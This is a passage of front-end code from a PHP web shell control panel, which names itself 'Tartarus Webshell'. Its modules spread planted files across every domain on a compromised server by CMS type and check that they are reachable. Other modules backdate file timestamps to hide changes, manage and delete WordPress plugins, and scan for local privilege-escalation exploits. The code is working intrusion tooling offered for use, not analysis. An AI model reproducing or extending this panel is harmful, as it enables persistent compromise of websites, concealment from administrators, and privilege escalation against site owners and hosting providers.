        try { var r = JSON.parse(x.responseText); if (cb) cb(r); }
        catch(e) { if (cb) cb({o:false, e:'JSON error'}); }
    };
    x.onerror = function() { if (cb) cb({o:false, e:'Network error'}); };
    x.send();
}

function prMsg(text, type) {
    var el = document.getElementById('prMsg');
    if (!text) { el.innerHTML = ''; return; }
    var colors = { ok: '#22c55e', err: '#ef4444', info: '#fff' };
    var bg = { ok: 'rgba(34,197,94,.08)', err: 'rgba(239,68,68,.08)', info: 'rgba(255,255,255,.05)' };
    var bc = { ok: 'rgba(34,197,94,.2)', err: 'rgba(239,68,68,.2)', info: 'rgba(255,255,255,.1)' };
    el.innerHTML = '<div style="padding:10px 16px;background:' + (bg[type]||bg.info) + ';border:1px solid ' + (bc[type]||bc.info) + ';border-radius:8px;font-size:13px;color:' + (colors[type]||colors.info) + ';">' + text + '</div>';
}

function prLog(action, domain, detail) {
    var logs = [];
    try { logs = JSON.parse(localStorage.getItem('prLogs') || '[]'); } catch(e) {}
    var now = new Date();
    var ts = now.toLocaleDateString('en-US') + ' ' + now.toLocaleTimeString('en-US');
    logs.unshift({ ts: ts, action: action, domain: domain, detail: detail });
    if (logs.length > 50) logs = logs.slice(0, 50);
    try { localStorage.setItem('prLogs', JSON.stringify(logs)); } catch(e) {}
    prRenderLog();
}

function prRenderLog() {
    var el = document.getElementById('prLogContent');
    var logs = [];
    try { logs = JSON.parse(localStorage.getItem('prLogs') || '[]'); } catch(e) {}
    if (!logs.length) { el.innerHTML = '<p style="color:var(--text-ter);">No records</p>'; return; }
    var html = '';
    for (var i = 0; i < logs.length; i++) {
        var l = logs[i];
        var ac = l.action === 'deploy' ? '<span style="color:#22c55e;">Deploy</span>' : l.action === 'remove' ? '<span style="color:#ef4444;">Remove</span>' : l.action === 'deployall' ? '<span style="color:#3b82f6;">Deploy All</span>' : '<span style="color:var(--text-sec);">' + l.action + '</span>';
        html += '<div style="padding:4px 0;border-bottom:1px solid var(--card-border);display:flex;gap:12px;align-items:center;"><span style="color:var(--text-ter);min-width:120px;">' + l.ts + '</span>' + ac + '<span style="color:var(--text);">' + l.domain + '</span>' + (l.detail ? '<span style="color:var(--text-sec);">' + l.detail + '</span>' : '') + '</div>';
    }
    el.innerHTML = html;
}

function prClearLog() {
    try { localStorage.removeItem('prLogs'); } catch(e) {}
    prRenderLog();
}

function prDeployPaths(cms) {
    var paths = prPaths[cms] || prPaths.generic;
    var html = '<div style="padding:8px 0;">';
    for (var i = 0; i < paths.length; i++) {
        html += '<div style="padding:3px 0;font-size:12px;color:var(--text-sec);font-family:monospace;padding-left:12px;"><i class="fas fa-file-code" style="color:var(--text-ter);margin-right:6px;font-size:10px;"></i>' + paths[i] + '</div>';
    }
    html += '</div>';
    return html;
}

function prRenderFilters() {
    var counts = { all: prData.length, wp: 0, joomla: 0, laravel: 0, drupal: 0, generic: 0 };
    for (var i = 0; i < prData.length; i++) {
        var cms = prData[i].cms;
        if (counts[cms] !== undefined) counts[cms]++;
    }
    var labels = { all: 'All', wp: 'WP', joomla: 'Joomla', laravel: 'Laravel', drupal: 'Drupal', generic: 'Generic' };
    var el = document.getElementById('prFilters');
    var html = '';
    for (var k in labels) {
        if (k !== 'all' && counts[k] === 0) continue;
        var active = prFilter === k;
        html += '<button onclick="prSetFilter(\'' + k + '\')" style="padding:5px 14px;border-radius:16px;font-size:12px;font-weight:600;border:1px solid ' + (active ? 'var(--text)' : 'var(--card-border)') + ';background:' + (active ? 'var(--text)' : 'transparent') + ';color:' + (active ? 'var(--bg)' : 'var(--text-sec)') + ';cursor:pointer;transition:all .2s;">' + labels[k] + ' <span style="opacity:.6;">' + counts[k] + '</span></button>';
    }
    el.innerHTML = html;
}

function prSetFilter(f) { prFilter = f; prRenderFilters(); prRenderTable(); }

function prGetSelected() {
    var s = [];
    var cbs = document.querySelectorAll('.pr-cb:checked');
    for (var i = 0; i < cbs.length; i++) s.push(cbs[i].value);
    return s;
}

function prUpdateBulkBtns() {
    var s = prGetSelected();
    var bulkD = document.getElementById('prBtnBulk');
    var bulkR = document.getElementById('prBtnBulkRm');
    var cnt = document.getElementById('prSelectedCount');
    if (s.length > 0) {
        bulkD.style.display = ''; bulkR.style.display = ''; cnt.style.display = '';
        cnt.textContent = s.length + ' selected';
    } else {
        bulkD.style.display = 'none'; bulkR.style.display = 'none'; cnt.style.display = 'none';
    }
}

function prSelectAll() {
    var cbs = document.querySelectorAll('.pr-cb');
    var allChecked = true;
    for (var i = 0; i < cbs.length; i++) { if (!cbs[i].checked) { allChecked = false; break; } }
    for (var i = 0; i < cbs.length; i++) cbs[i].checked = !allChecked;
    prUpdateBulkBtns();
}

function prToggleExpand(idx) {
    var el = document.getElementById('prPaths_' + idx);
    if (!el) return;
    if (el.style.display === 'none' || !el.innerHTML) {
        var x = prData[idx];
        el.innerHTML = prDeployPaths(x.cms);
        el.style.display = '';
    } else {
        el.style.display = 'none';
    }
}

function prToggleAutoRefresh() {
    var cb = document.getElementById('prAutoRefresh');
    if (cb.checked) {
        prAutoTimer = setInterval(function() { loadPropagate(true); }, 30000);
        prMsg('Auto refresh enabled (30s)', 'info');
    } else {
        if (prAutoTimer) clearInterval(prAutoTimer);
        prAutoTimer = null;
        prMsg('', '');
    }
}

function loadPropagate(silent) {
    var el = document.getElementById('prResults');
    if (!silent) {
        el.innerHTML = '<div class="card" style="text-align:center;padding:40px;"><i class="fas fa-spinner fa-spin" style="font-size:36px;color:var(--text-ter);margin-bottom:12px;display:block;"></i><p style="color:var(--text-sec);font-size:14px;">Scanning domains...</p></div>';
    }
    prApi('scan', null, function(r) {
        if (!r || !r.o) { el.innerHTML = '<div class="card" style="text-align:center;padding:40px;"><i class="fas fa-exclamation-triangle" style="font-size:36px;color:#ef4444;margin-bottom:12px;display:block;"></i><p style="color:#ef4444;font-size:14px;">' + (r && r.e || 'Scan error') + '</p></div>'; return; }
        prData = r.list || [];
        var curDom = r.current || '';
        prRenderFilters();
        prRenderTable(curDom);
    });
}

function prRenderTable(curDom) {
    var el = document.getElementById('prResults');
    var list = prData;
    if (prFilter !== 'all') {
        var filtered = [];
        for (var i = 0; i < list.length; i++) { if (list[i].cms === prFilter) filtered.push(list[i]); }
        list = filtered;
    }
    var deployedCount = 0;
    for (var i = 0; i < prData.length; i++) deployedCount += prData[i].count;
    var html = '<div class="stats-bar"><span><i class="fas fa-globe"></i> <strong>' + prData.length + '</strong> Domains</span><span style="color:#22c55e;"><i class="fas fa-check-circle"></i> <strong>' + deployedCount + '</strong> Deployed</span>';
    if (curDom) html += '<span style="color:#22c55e;"><i class="fas fa-circle" style="font-size:6px;"></i> Active: <strong>' + curDom + '</strong></span>';
    if (prFilter !== 'all') html += '<span style="color:var(--text-sec);"><i class="fas fa-filter"></i> <strong>' + list.length + '</strong> Filtered</span>';
    html += '</div>';
    if (list.length) {
        html += '<div class="card" style="padding:0;overflow:hidden;">';
        html += '<table style="width:100%;border-collapse:collapse;font-size:13px;">';
        html += '<thead><tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.015);">';
        html += '<th style="padding:10px 12px;width:30px;"><input type="checkbox" onchange="prSelectAll()" style="accent-color:var(--text);"></th>';
        html += '<th style="padding:12px 16px;text-align:left;color:var(--text-sec);font-size:11px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Domain</th>';
        html += '<th style="padding:12px 16px;text-align:left;color:var(--text-sec);font-size:11px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;">CMS</th>';
        html += '<th style="padding:12px 16px;text-align:center;color:var(--text-sec);font-size:11px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Files</th>';
        html += '<th style="padding:12px 16px;text-align:right;color:var(--text-sec);font-size:11px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;"></th>';
        html += '</tr></thead><tbody>';
        for (var i = 0; i < list.length; i++) {
            var x = list[i];
            var origIdx = prData.indexOf(x);
            var st = x.count > 0
                ? '<span style="display:inline-flex;align-items:center;gap:4px;padding:3px 10px;background:rgba(34,197,94,0.08);border:1px solid rgba(34,197,94,0.2);border-radius:16px;font-size:11px;font-weight:600;color:#22c55e;">' + x.count + '/' + x.total + '</span>'
                : '<span style="display:inline-flex;align-items:center;gap:4px;padding:3px 10px;background:rgba(255,255,255,0.03);border:1px solid var(--card-border);border-radius:16px;font-size:11px;font-weight:600;color:var(--text-ter);">0/' + x.total + '</span>';
            var btn = x.count > 0
                ? '<button class="btn btn-sm btn-danger" onclick="prRemove(\'' + x.p.replace(/'/g, "\\'") + '\',\'' + x.cms + '\',\'' + x.d.replace(/'/g, "\\'") + '\')"><i class="fas fa-trash"></i></button> '
                : '';
            btn += '<button class="btn btn-sm btn-accent" onclick="prDeploy(\'' + x.p.replace(/'/g, "\\'") + '\',\'' + x.cms + '\',\'' + x.d.replace(/'/g, "\\'") + '\')"><i class="fas fa-rocket"></i></button>';
            btn += ' <button class="btn btn-sm" onclick="prHealthCheck(\'' + x.d.replace(/'/g, "\\'") + '\',\'' + x.cms + '\')" title="Health Check"><i class="fas fa-heartbeat"></i></button>';
            var sizeStr = x.size > 0 ? (x.size > 1048576 ? (x.size/1048576).toFixed(1)+'MB' : (x.size/1024).toFixed(0)+'KB') : '';
            var isCur = (curDom && (x.d === curDom || x.d === 'www.' + curDom || 'www.' + x.d === curDom));
            var domLabel = isCur ? '<i class="fas fa-circle" style="font-size:6px;color:#22c55e;margin-right:6px;"></i>' : '';
            var domColor = isCur ? '#22c55e' : 'var(--text)';
            html += '<tr style="border-bottom:1px solid var(--card-border);' + (isCur ? 'background:rgba(34,197,94,.03);' : '') + '">';
            html += '<td style="padding:10px 12px;"><input type="checkbox" class="pr-cb" value="' + i + '" onchange="prUpdateBulkBtns()" style="accent-color:var(--text);"></td>';
            html += '<td style="padding:12px 16px;"><span style="font-weight:600;color:' + domColor + ';cursor:pointer;" onclick="prToggleExpand(' + origIdx + ')">' + domLabel + x.d + ' <i class="fas fa-chevron-down" style="font-size:9px;color:var(--text-ter);"></i></span>' + (sizeStr ? ' <span style="font-size:10px;color:var(--text-ter);">' + sizeStr + '</span>' : '') + '<div id="prPaths_' + origIdx + '" style="display:none;"></div></td>';
            html += '<td style="padding:12px 16px;"><span style="display:inline-flex;align-items:center;gap:4px;padding:2px 10px;background:rgba(255,255,255,0.05);border:1px solid var(--card-border);border-radius:16px;font-size:11px;font-weight:600;color:var(--text);">' + x.cms + '</span></td>';
            html += '<td style="padding:12px 16px;text-align:center;">' + st + '</td>';
            html += '<td style="padding:12px 16px;text-align:right;white-space:nowrap;">' + btn + '</td>';
            html += '</tr>';
        }
        html += '</tbody></table></div>';
    } else {
        html += '<div class="card" style="text-align:center;padding:40px;"><i class="fas fa-globe" style="font-size:48px;color:var(--text-ter);margin-bottom:16px;display:block;opacity:0.3;"></i><p style="color:var(--text-sec);font-size:14px;">' + (prFilter !== 'all' ? 'No domains in this category' : 'No domains found') + '</p></div>';
    }
    el.innerHTML = html;
}

function prDeploy(dir, cms, domain) {
    var note = document.getElementById('prNote') ? document.getElementById('prNote').value.trim() : '';
    var params = {d: dir, cms: cms, domain: domain};
    if (note) params.note = note;
    prMsg('Deploying: ' + domain + '...', 'info');
    prApi('deploy', params, function(r) {
        if (r && r.o) {
            prLog('deploy', domain, r.deployed + '/' + r.total);
            prMsg(domain + ': ' + r.deployed + '/' + r.total + ' files deployed', 'ok');
            loadPropagate(true);
        } else prMsg('Error: ' + (r && r.e || 'Unknown'), 'err');
    });
}

function prRemove(dir, cms, domain) {
    if (!confirm('Remove files for ' + domain + '?')) return;
    prMsg('Removing: ' + domain + '...', 'info');
    prApi('remove', {d: dir, cms: cms}, function(r) {
        if (r && r.o) {
            prLog('remove', domain, r.msg);
            prMsg(r.msg, 'ok');
            loadPropagate(true);
        } else prMsg('Error: ' + (r && r.e || 'Unknown'), 'err');
    });
}

function prDeployAll() {
    if (!confirm('Deploy to all domains?')) return;
    var note = document.getElementById('prNote') ? document.getElementById('prNote').value.trim() : '';
    var btn = document.getElementById('prBtnAll');
    var orig = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Deploying...';
    btn.disabled = true;
    var params = {};
    if (note) params.note = note;
    prMsg('Deploying to all domains...', 'info');
    prApi('deployall', params, function(r) {
        btn.innerHTML = orig; btn.disabled = false;
        if (r && r.o) {
            prLog('deployall', 'All domains', r.ok + ' OK, ' + r.err + ' failed');
            prMsg('Completed: ' + r.ok + ' OK, ' + r.err + ' failed', r.err > 0 ? 'info' : 'ok');
            loadPropagate(true);
        } else prMsg('Error: ' + (r && r.e || 'Unknown'), 'err');
    });
}

function prBulkDeploy() {
    var sel = prGetSelected();
    if (!sel.length) return;
    if (!confirm('Deploy to ' + sel.length + ' domain(s)?')) return;
    var dirs = [], domains = [];
    for (var i = 0; i < sel.length; i++) {
        var x = prData[parseInt(sel[i])];
        if (x) { dirs.push(x.p); domains.push(x.d); }
    }
    var note = document.getElementById('prNote') ? document.getElementById('prNote').value.trim() : '';
    var btn = document.getElementById('prBtnBulk');
    var orig = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
    btn.disabled = true;
    var params = {dirs: dirs.join('|'), domains: domains.join('|')};
    if (note) params.note = note;
    prMsg('Deploying to ' + sel.length + ' domain(s)...', 'info');
    prApi('bulkdeploy', params, function(r) {
        btn.innerHTML = orig; btn.disabled = false;
        if (r && r.o) {
            prLog('deploy', sel.length + ' domains', r.ok + ' OK, ' + r.err + ' failed');
            prMsg('Completed: ' + r.ok + ' OK, ' + r.err + ' failed', r.err > 0 ? 'info' : 'ok');
            loadPropagate(true);
        } else prMsg('Error: ' + (r && r.e || 'Unknown'), 'err');
    });
}

function prBulkRemove() {
    var sel = prGetSelected();
    if (!sel.length) return;
    if (!confirm('Remove files from ' + sel.length + ' domain(s)?')) return;
    var dirs = [];
    for (var i = 0; i < sel.length; i++) {
        var x = prData[parseInt(sel[i])];
        if (x) dirs.push(x.p);
    }
    var btn = document.getElementById('prBtnBulkRm');
    var orig = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
    btn.disabled = true;
    prMsg('Removing from ' + sel.length + ' domain(s)...', 'info');
    prApi('bulkremove', {dirs: dirs.join('|')}, function(r) {
        btn.innerHTML = orig; btn.disabled = false;
        if (r && r.o) {
            prLog('remove', sel.length + ' domains', r.msg);
            prMsg(r.msg, 'ok');
            loadPropagate(true);
        } else prMsg('Error: ' + (r && r.e || 'Unknown'), 'err');
    });
}

function prHealthCheck(domain, cms) {
    prMsg('Health check: ' + domain + '...', 'info');
    prApi('healthcheck', {domain: domain, cms: cms}, function(r) {
        if (r && r.o) {
            var msg = '<b>' + domain + '</b> - ' + r.ok + '/' + r.total + ' reachable<br>';
            for (var i = 0; i < r.results.length; i++) {
                var res = r.results[i];
                var icon = res.alive ? '<span style="color:#22c55e;">&#10003;</span>' : '<span style="color:#ef4444;">&#10007;</span>';
                msg += icon + ' <code style="font-size:11px;color:var(--text-sec);">' + res.code + '</code> ' + res.path + '<br>';
            }
            prMsg(msg, r.ok === r.total ? 'ok' : 'info');
        } else prMsg('Error: ' + (r && r.e || 'Unknown'), 'err');
    });
}

prRenderLog();
loadPropagate();
</script>
<?php elseif ($page === 'spoofer'): ?>
<div class="page-header">
    <h1 class="page-title"><i class="fas fa-clock" style="color:var(--text);margin-right:10px;"></i> Spoofer</h1>
</div>

<div class="card" style="padding:14px 20px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
    <button class="btn btn-accent" onclick="spRun()" id="spBtn"><i class="fas fa-clock"></i> Spoof</button>
    <span id="spInfo" style="font-size:12px;color:var(--text-sec);"></span>
</div>

<div id="spMsg" style="margin:12px 0;"></div>

<script>
(() => {
    const $ = id => document.getElementById(id);

    function spMsg(text, type) {
        const el = $('spMsg');
        if (!text) { el.innerHTML = ''; return; }
        const c = { ok: '#22c55e', err: '#ef4444', info: '#fff' };
        const bg = { ok: 'rgba(34,197,94,.08)', err: 'rgba(239,68,68,.08)', info: 'rgba(255,255,255,.05)' };
        const bc = { ok: 'rgba(34,197,94,.2)', err: 'rgba(239,68,68,.2)', info: 'rgba(255,255,255,.1)' };
        el.innerHTML = `<div style="padding:10px 16px;background:${bg[type]||bg.info};border:1px solid ${bc[type]||bc.info};border-radius:8px;font-size:13px;color:${c[type]||c.info};">${text}</div>`;
    }

    function fmtDate(ts) {
        const d = new Date(ts * 1000);
        return d.toLocaleDateString('en-US') + ' ' + d.toLocaleTimeString('en-US');
    }

    window.spRun = async function() {
        const btn = $('spBtn');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning...';
        btn.disabled = true;
        spMsg('Scanning...', 'info');

        const scanUrl = `?sp=1&m=scan&_=${Date.now()}`;
        let r;
        try { r = await fetch(scanUrl).then(x => x.json()); }
        catch(e) { r = {o:false,e:'Network error'}; }

        if (!r || !r.o) {
            btn.innerHTML = '<i class="fas fa-clock"></i> Spoof';
            btn.disabled = false;
            spMsg('Error: ' + (r?.e || 'Unknown'), 'err');
            return;
        }

        $('spInfo').textContent = `${r.count} files — ${r.root || ''}`;
        const src = r.ht ? '.htaccess' : 'oldest file';
        spMsg(`${r.count} files found (source: ${src}) — will be applied to target ${fmtDate(r.target)}`, 'info');

        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Applying...';

        const applyUrl = `?sp=1&m=apply&target=${r.target}&_=${Date.now()}`;
        let a;
        try { a = await fetch(applyUrl).then(x => x.json()); }
        catch(e) { a = {o:false,e:'Network error'}; }

        btn.innerHTML = '<i class="fas fa-clock"></i> Spoof';
        btn.disabled = false;

        if (a && a.o) {
            spMsg(`<b>${a.count}</b> files' timestamps updated → ${fmtDate(a.target)}`, 'ok');
        } else spMsg('Error: ' + (a?.e || 'Unknown'), 'err');
    };
})();
</script>
<?php elseif ($page === 'cache'): ?>
<div class="page-header">
    <h1 class="page-title"><i class="fas fa-broom" style="color:var(--text);margin-right:10px;"></i> Clear Cache</h1>
</div>

<div class="card" style="padding:14px 20px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
    <button class="btn btn-accent" onclick="ccClean()" id="ccBtn"><i class="fas fa-broom"></i> Clear Cache</button>
    <span id="ccInfo" style="font-size:12px;color:var(--text-sec);"></span>
</div>

<div id="ccMsg" style="margin:12px 0;"></div>
<div id="ccList" style="margin-top:14px;"></div>

<script>
(() => {
    const $ = id => document.getElementById(id);
    let ccItems = [];

    function ccMsg(text, type) {
        const el = $('ccMsg');
        if (!text) { el.innerHTML = ''; return; }
        const c = { ok:'#22c55e', err:'#ef4444', info:'#fff' };
        const bg = { ok:'rgba(34,197,94,.08)', err:'rgba(239,68,68,.08)', info:'rgba(255,255,255,.05)' };
        const bc = { ok:'rgba(34,197,94,.2)', err:'rgba(239,68,68,.2)', info:'rgba(255,255,255,.1)' };
        el.innerHTML = `<div style="padding:10px 16px;background:${bg[type]||bg.info};border:1px solid ${bc[type]||bc.info};border-radius:8px;font-size:13px;color:${c[type]||c.info};">${text}</div>`;
    }

    function fmtS(b) { if(b>1048576)return(b/1048576).toFixed(1)+'MB'; if(b>1024)return(b/1024).toFixed(0)+'KB'; return b+'B'; }

    async function ccLoad() {
        ccItems = [];
        let r; try { r = await fetch(`?cc=1&m=scan&_=${Date.now()}`).then(x=>x.json()); } catch(e) { r={o:false}; }
        if (!r || !r.o || !r.items.length) {
            $('ccList').innerHTML = '<div class="card" style="text-align:center;padding:40px;"><i class="fas fa-check-circle" style="font-size:48px;color:#22c55e;margin-bottom:16px;display:block;opacity:0.4;"></i><p style="color:var(--text-sec);font-size:14px;">No cache found</p></div>';
            $('ccBtn').style.display = 'none';
            $('ccInfo').textContent = 'Clean';
            return;
        }
        ccItems = r.items;
        $('ccInfo').textContent = `${r.items.length} cache folders — ${fmtS(r.totalSize)} — ${r.totalFiles} files`;
        $('ccBtn').style.display = '';
        let html = '<div class="card" style="padding:0;overflow:hidden;"><table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.015);"><th style="padding:10px 16px;text-align:left;color:var(--text-ter);font-size:10px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Path</th><th style="padding:10px 16px;text-align:right;color:var(--text-ter);font-size:10px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Files</th><th style="padding:10px 16px;text-align:right;color:var(--text-ter);font-size:10px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Size</th></tr></thead><tbody>';
        r.items.forEach(it => { html += `<tr style="border-bottom:1px solid rgba(255,255,255,0.02);"><td style="padding:8px 16px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text);">${it.path}</td><td style="padding:8px 16px;text-align:right;color:var(--text-ter);">${it.files}</td><td style="padding:8px 16px;text-align:right;color:var(--text-sec);">${fmtS(it.size)}</td></tr>`; });
        html += '</tbody></table></div>';
        $('ccList').innerHTML = html;
    }

    window.ccClean = async function() {
        if (!ccItems.length) return;
        if (!confirm(`Are you sure you want to clear ${ccItems.length} cache folder(s)?`)) return;
        const btn = $('ccBtn');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Cleaning...';
        btn.disabled = true;
        ccMsg('Clearing cache...', 'info');
        let r; try { r = await fetch(`?cc=1&m=clean&_=${Date.now()}`).then(x=>x.json()); } catch(e) { r={o:false}; }
        btn.innerHTML = '<i class="fas fa-broom"></i> Clear Cache';
        btn.disabled = false;
        if (r && r.o) {
            ccMsg(`<b>${r.count}</b> files deleted`, 'ok');
            ccLoad();
        } else ccMsg('Error: ' + (r?.e || 'Unknown'), 'err');
    };

    ccLoad();
})();
</script>
<?php elseif ($page === 'plugins'): ?>
<div class="page-header">
    <h1 class="page-title"><i class="fas fa-puzzle-piece" style="color:var(--text);margin-right:10px;"></i> WP Plugins</h1>
</div>

<div class="card" style="padding:14px 20px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
    <button class="btn btn-accent" onclick="plLoad()" id="plRefresh"><i class="fas fa-sync-alt"></i> Refresh</button>
    <button class="btn" onclick="plToggleAll(true)" id="plActAll" style="display:none;"><i class="fas fa-check-double"></i> Activate All</button>
    <button class="btn" onclick="plToggleAll(false)" id="plDeactAll" style="display:none;"><i class="fas fa-ban"></i> Deactivate All</button>
    <span id="plInfo" style="font-size:12px;color:var(--text-sec);"></span>
</div>

<div id="plMsg" style="margin:12px 0;"></div>
<div id="plList" style="margin-top:14px;"></div>

<script>
(() => {
    const $ = id => document.getElementById(id);
    let plData = [];

    function plMsg(text, type) {
        const el = $('plMsg');
        if (!text) { el.innerHTML = ''; return; }
        const c = { ok:'#22c55e', err:'#ef4444', info:'#fff' };
        const bg = { ok:'rgba(34,197,94,.08)', err:'rgba(239,68,68,.08)', info:'rgba(255,255,255,.05)' };
        const bc = { ok:'rgba(34,197,94,.2)', err:'rgba(239,68,68,.2)', info:'rgba(255,255,255,.1)' };
        el.innerHTML = `<div style="padding:10px 16px;background:${bg[type]||bg.info};border:1px solid ${bc[type]||bc.info};border-radius:8px;font-size:13px;color:${c[type]||c.info};">${text}</div>`;
    }

    function esc(s) { const d=document.createElement('div'); d.textContent=s; return d.innerHTML; }

    async function plLoad() {
        plData = [];
        plMsg('Loading...', 'info');
        let r; try { r = await fetch(`?wpl=1&m=list&_=${Date.now()}`).then(x=>x.json()); } catch(e) { r={o:false}; }
        plMsg('', '');
        if (!r || !r.o) { plMsg('Error: ' + (r?.e || 'No WP connection'), 'err'); $('plList').innerHTML=''; return; }
        plData = r.plugins || [];
        const actCount = r.activeCount || 0;
        $('plInfo').textContent = `${plData.length} plugins — ${actCount} active`;
        if (plData.length > 1) { $('plActAll').style.display=''; $('plDeactAll').style.display=''; }
        let html = '<div class="card" style="padding:0;overflow:hidden;">';
        html += '<div style="padding:12px 16px;border-bottom:1px solid var(--card-border);font-size:12px;color:var(--text-sec);display:flex;gap:16px;align-items:center;"><span><b style="color:var(--text);">'+plData.length+'</b> plugins</span><span><b style="color:#22c55e;">'+actCount+'</b> active</span><span><b style="color:var(--text-ter);">'+(plData.length-actCount)+'</b> inactive</span></div>';
        html += '<div style="max-height:600px;overflow-y:auto;">';
        plData.forEach(p => {
            const clr = p.active ? '#22c55e' : 'var(--text-ter)';
            const bgc = p.active ? 'rgba(34,197,94,.08)' : 'rgba(255,255,255,.02)';
            const brd = p.active ? 'rgba(34,197,94,.2)' : 'var(--card-border)';
            const toggleLabel = p.active ? 'Deactivate' : 'Activate';
            const toggleIcon = p.active ? 'fa-toggle-off' : 'fa-toggle-on';
            const toggleClr = p.active ? '#f59e0b' : '#22c55e';
            html += `<div style="padding:14px 20px;border-bottom:1px solid var(--card-border);background:${bgc};display:flex;align-items:center;gap:14px;flex-wrap:wrap;">`;
            html += `<div style="flex:1;min-width:200px;"><div style="font-size:14px;font-weight:600;color:var(--text);margin-bottom:2px;">${esc(p.name)}</div>`;
            html += `<div style="font-size:11px;color:var(--text-ter);font-family:'JetBrains Mono',monospace;">${esc(p.slug)}${p.ver ? ' v'+esc(p.ver) : ''}</div>`;
            if (p.desc) html += `<div style="font-size:12px;color:var(--text-sec);margin-top:4px;">${esc(p.desc)}</div>`;
            html += `</div>`;
            html += `<div style="display:flex;align-items:center;gap:8px;">`;
            html += `<span style="padding:3px 10px;border-radius:12px;font-size:10px;font-weight:700;border:1px solid ${brd};color:${clr};background:${bgc};">${p.active?'ACTIVE':'INACTIVE'}</span>`;
            html += `<button onclick="plToggle('${esc(p.slug)}')" style="background:${toggleClr};color:#fff;border:none;padding:6px 12px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;display:flex;align-items:center;gap:4px;"><i class="fas ${toggleIcon}"></i> ${toggleLabel}</button>`;
            html += `<button onclick="plDelete('${esc(p.slug)}','${esc(p.name)}')" style="background:#ef4444;color:#fff;border:none;padding:6px 12px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;display:flex;align-items:center;gap:4px;"><i class="fas fa-trash"></i> Delete</button>`;
            html += `</div></div>`;
        });
        html += '</div></div>';
        $('plList').innerHTML = html;
    }

    async function plToggle(slug) {
        plMsg('Processing...', 'info');
        let r; try { r = await fetch(`?wpl=1&m=toggle&slug=${encodeURIComponent(slug)}&_=${Date.now()}`).then(x=>x.json()); } catch(e) { r={o:false}; }
        if (r && r.o) {
            plMsg(`${slug} ${r.activated ? 'activated' : 'deactivated'}`, 'ok');
            plLoad();
        } else plMsg('Error: ' + (r?.e || 'Unknown'), 'err');
    }

    async function plDelete(slug, name) {
        if (!confirm(`Are you sure you want to delete plugin "${name}"?`)) return;
        plMsg('Deleting...', 'info');
        let r; try { r = await fetch(`?wpl=1&m=delete&slug=${encodeURIComponent(slug)}&_=${Date.now()}`).then(x=>x.json()); } catch(e) { r={o:false}; }
        if (r && r.o) {
            plMsg(`${name} deleted ✓ (${r.count} files, folder: ${r.dirDeleted?'deleted':'REMAINED'}, DB: ${r.dbCleaned?'cleaned':'REMAINED'})`, 'ok');
            plLoad();
        } else if (r && r.count !== undefined) {
            const parts = [];
            parts.push(`${r.count} files deleted`);
            parts.push(`folder: ${r.dirDeleted?'deleted':'REMAINED'}`);
            parts.push(`DB: ${r.dbCleaned?'cleaned':'REMAINED'}`);
            plMsg('Partial success — ' + parts.join(', '), 'err');
            plLoad();
        } else plMsg('Error: ' + (r?.e || 'Unknown'), 'err');
    }

    window.plToggleAll = async function(activate) {
        const inactive = plData.filter(p => !activate && p.active);
        const active = plData.filter(p => activate && !p.active);
        const targets = activate ? active : inactive;
        if (!targets.length) return;
        if (!confirm(`Are you sure you want to ${activate?'activate':'deactivate'} ${targets.length} plugin(s)?`)) return;
        for (const p of targets) {
            let r; try { r = await fetch(`?wpl=1&m=toggle&slug=${encodeURIComponent(p.slug)}&_=${Date.now()}`).then(x=>x.json()); } catch(e) { r={o:false}; }
        }
        plLoad();
    };

    window.plToggle = plToggle;
    window.plDelete = plDelete;
    plLoad();
})();
</script>
<?php elseif ($page === 'exploit'): ?>
<div class="page-header" style="margin-bottom:12px;">
    <h1 class="page-title"><i class="fas fa-bug" style="color:var(--text);margin-right:10px;"></i> Exploit Checker</h1>
    <p style="color:var(--text-ter);font-size:13px;margin-top:4px;">Tartarus Webshell — LPE &amp; exploit compatibility scan</p>
</div>
<div id="exDiagBox" class="card" style="padding:14px 16px;margin-bottom:14px;"></div>
<div style="display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;">
    <button onclick="exScan('copyfail')" class="btn btn-primary"><i class="fas fa-copy"></i> CopyFail (CVE-2026-31431)</button>
    <button onclick="exScan('dirtyfrag')" class="btn btn-primary"><i class="fas fa-bomb"></i> DirtyFrag (CVE-2026-43284/43500)</button>
    <button onclick="exScan('altcves')" class="btn btn-secondary"><i class="fas fa-list"></i> Alternative CVEs</button>
</div>
<div id="exResult"></div>
<script>
(function(){
const exPost = async (action, extra) => {
    const fd = new FormData();
    fd.append('ex', action);
    if (extra) for (const k in extra) fd.append(k, extra[k]);
    const r = await fetch('?', {method:'POST', body:fd}).then(x=>x.json());
    return r;
};
window.exScan = async function(action){
    const box = document.getElementById('exResult');
    box.innerHTML = '<div class="card" style="padding:20px;color:var(--text-ter);">Scanning...</div>';
    let r;
    try { r = await exPost(action); } catch(e) { box.innerHTML = '<div class="card" style="padding:20px;color:#ef4444;">Error: '+e.message+'</div>'; return; }
    if (r.error) { box.innerHTML = '<div class="card" style="padding:20px;color:#ef4444;">'+r.error+'</div>'; return; }
    if (action === 'altcves') {
